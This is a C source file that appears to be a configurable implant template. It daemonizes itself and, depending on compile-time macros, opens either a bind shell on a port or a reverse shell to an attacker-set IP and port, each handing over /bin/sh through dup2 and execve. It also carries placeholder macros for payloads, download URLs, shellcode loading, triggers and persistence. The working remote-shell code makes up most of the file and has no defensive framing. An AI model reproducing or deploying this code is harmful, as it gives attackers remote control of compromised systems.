//#define IPADDR "192.168.1.1"

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>
//#include <curl/curl.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

void foo();

int main(void) {

        /* Our process ID and Session ID */
        pid_t pid, sid;

        /* Fork off the parent process */
        pid = fork();
        if (pid < 0) {
                exit(EXIT_FAILURE);
        }
        /* If we got a good PID, then
           we can exit the parent process. */
        if (pid > 0) {
                exit(EXIT_SUCCESS);
        }

        /* Change the file mode mask */
        umask(0);

        /* Open any logs here */

        /* Create a new SID for the child process */
        sid = setsid();
        if (sid < 0) {
                /* Log the failure */
                exit(EXIT_FAILURE);
        }



        /* Change the current working directory */
        if ((chdir("/")) < 0) {
                /* Log the failure */
                exit(EXIT_FAILURE);
        }

        /* Close out the standard file descriptors */
        //close(STDIN_FILENO);
        //close(STDOUT_FILENO);
        //close(STDERR_FILENO);

        /* Daemon-specific initialization goes here */

        /* The Big Loop */
        //while (1) {
           /* Do some task here ... */
           #ifdef BINDSHELL
           foo(); //bindshell code
           //break;
           #endif

           #ifdef REVERSESHELL
           foo(); //reverseshell code
           //break;
           #endif

           //sleep(30); /* wait 30 seconds */
        //}
  //VALIDATOR!!!!!!!!!!!!!!!!!!!
   exit(EXIT_SUCCESS);
}


void foo()
{
  #ifdef DEBUG
  printf("Error occurred!\n");
  if(errno != 0)
    perror("Error description");
  #endif

  #ifdef IPADDR
  printf("IPADDR: %s!\n", IPADDR);
  #endif

  #ifdef DOMAIN
  printf("DOMAIN: %s!\n", DOMAIN);
  #endif

  #ifdef PLATFORM
  printf("PLATFORM: %s!\n", PLATFORM);
  #endif

  #ifdef ARCH
  printf("ARCH: %s!\n", ARCH);
  #endif

  #ifdef OS
  printf("OS: %s!\n", OS);
  #endif

  #ifdef VERSION_NUM
  printf("VERSION_NUM: %s!\n", VERSION_NUM);
  #endif

  #ifdef PAYLOAD
  printf("PAYLOAD: %s!\n", PAYLOAD);
  #endif

  #ifdef INTERFACE
  printf("INTERFACE: %s!\n", INTERFACE);
  #endif

  #ifdef ACTIVATE
  printf("ACTIVATE: %s!\n", ACTIVATE);
  #endif

  #ifdef SIZE
  printf("SIZE: %s!\n", SIZE);
  #endif

  #ifdef TRIGGER
  printf("TRIGGER: %s!\n", TRIGGER);
  #endif

  #ifdef DELAY
  printf("DELAY: %s!\n", DELAY);
  #endif

  #ifdef DATEDELAY
  printf("DATEDELAY: %s!\n", DATEDELAY);
  #endif

  #ifdef DOWNLOADURL
  printf("DOWNLOADURL: %s!\n", DOWNLOADURL);
  #endif

  #ifdef BANG
  printf("BANG: %d!\n", BANG);
  #endif

  #ifdef LOADSHELLCODE
  printf("LOADSHELLCODE: %d!\n", LOADSHELLCODE);
  #endif

  #ifdef BINDSHELL
  printf("BINDSHELL: %d!\n", BINDSHELL);
  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(REVPORT);
  addr.sin_addr.s_addr = INADDR_ANY;

  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
  listen(sockfd, 0);

  int connfd = accept(sockfd, NULL, NULL);
  for (int i = 0; i < 3; i++)
  {
      dup2(connfd, i);
  }
  execve("/bin/sh", NULL, NULL);
  #endif

  #ifdef REVERSESHELL
  printf("REVERSESHELL: %d!\n", REVERSESHELL);
  const char* ip = REVIP;
  struct sockaddr_in addr;

  addr.sin_family = AF_INET;
  addr.sin_port = htons(REVPORT);
  inet_aton(ip, &addr.sin_addr);

  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

  for (int i = 0; i < 3; i++)
  {
      dup2(sockfd, i);
  }

  execve("/bin/sh", NULL, NULL);
  #endif

  #ifdef REVERSEIP
  printf("REVERSEIP: %s!\n", REVERSEIP);
  #endif

  #ifdef REVERSEPORT
  printf("REVERSEPORT: %s!\n", REVERSEPORT);
  #endif

  #ifdef PERSIST
  printf("PERSIST: %s!\n", PERSIST);
  #endif

  #ifdef NOTES
  printf("NOTES: %s!\n", NOTES);
  #endif

  #ifdef STRIP
  printf("STRIP: %d!\n", STRIP);
  #endif

  #ifdef STATIC
  printf("STATIC: %d!\n", STATIC);
  #endif
}